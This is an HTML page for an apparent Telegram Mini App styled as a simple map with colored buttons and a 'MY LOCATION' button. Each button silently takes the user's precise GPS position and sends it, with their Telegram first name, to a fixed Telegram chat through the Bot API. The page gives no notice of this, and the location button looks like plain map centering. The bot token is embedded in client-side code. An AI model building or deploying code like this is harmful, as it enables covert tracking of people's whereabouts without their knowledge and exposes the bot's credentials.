<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Telegram Mini GPS App</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

  <style>
    html, body {
      margin: 0;
      height: 100%;
      font-family: Arial;
      display: flex;
      flex-direction: column;
      background: #f5f5f5;
    }

    /* TOP BAR */
    #topbar {
      padding: 10px;
      background: #111;
      color: white;
      font-weight: bold;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    #map {
      height: 60vh;
      width: 100%;
    }

    #controls {
      flex: 1;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      padding: 10px;
    }

    button {
      height: 65px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      color: white;
    }

    .orange { background: orange; }
    .green { background: green; }
    .red { background: red; }
    .blue { background: blue; }
    .gray { background: #555; }
  </style>
</head>

<body>

<!-- TOP BAR -->
<div id="topbar">
  <div>📊 Clicks: <span id="count">0</span></div>
  <div>Mini GPS App</div>
</div>

<div id="map"></div>

<div id="controls">
  <button class="orange" onclick="sendGPS('orange')">ORANGE</button>
  <button class="green" onclick="sendGPS('green')">GREEN</button>
  <button class="red" onclick="sendGPS('red')">RED</button>
  <button class="blue" onclick="sendGPS('blue')">BLUE</button>

  <!-- NEW BUTTON -->
  <button class="gray" onclick="goToMyLocation()">📍 MY LOCATION</button>
</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<script>
const tg = window.Telegram.WebApp;
tg.expand();

const BOT_TOKEN = "YOUR_TEST_TOKEN";
const CHAT_ID = "2141064153";

const map = L.map('map').setView([50.8503, 4.3517], 13);

L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
  maxZoom: 19
}).addTo(map);

let cachedPosition = null;
let mapCentered = false;
let clickCount = 0;
let lastMarker = null;

/* UPDATE COUNTER */
function updateCount() {
  document.getElementById("count").innerText = clickCount;
}

/* DOT */
function createDot(lat, lng, color) {
  if (lastMarker) map.removeLayer(lastMarker);

  lastMarker = L.circleMarker([lat, lng], {
    radius: 8,
    color,
    fillColor: color,
    fillOpacity: 1
  }).addTo(map);
}

/* TELEGRAM */
function sendToTelegram(lat, lng, color) {
  const user = tg.initDataUnsafe?.user;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text:
`📍 MINI APP ACTION
🎨 ${color}
👤 ${user?.first_name || "unknown"}
📍 ${lat}, ${lng}`
    })
  });
}

/* GET LOCATION ONCE */
function getLocationOnce(cb) {
  if (cachedPosition) return cb(cachedPosition);

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      cachedPosition = {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude
      };
      cb(cachedPosition);
    },
    () => alert("Enable location"),
    { enableHighAccuracy: true }
  );
}

/* MAIN BUTTON ACTION */
function sendGPS(color) {
  clickCount++;
  updateCount();

  getLocationOnce((pos) => {
    createDot(pos.lat, pos.lng, color);
    map.setView([pos.lat, pos.lng], 16);
    sendToTelegram(pos.lat, pos.lng, color);
  });
}

/* NEW: MY LOCATION BUTTON */
function goToMyLocation() {
  clickCount++;
  updateCount();

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;

      cachedPosition = { lat, lng };

      createDot(lat, lng, "black");
      map.setView([lat, lng], 17);

      sendToTelegram(lat, lng, "my-location");
    },
    () => alert("Enable GPS")
  );
}
</script>

</body>
</html>
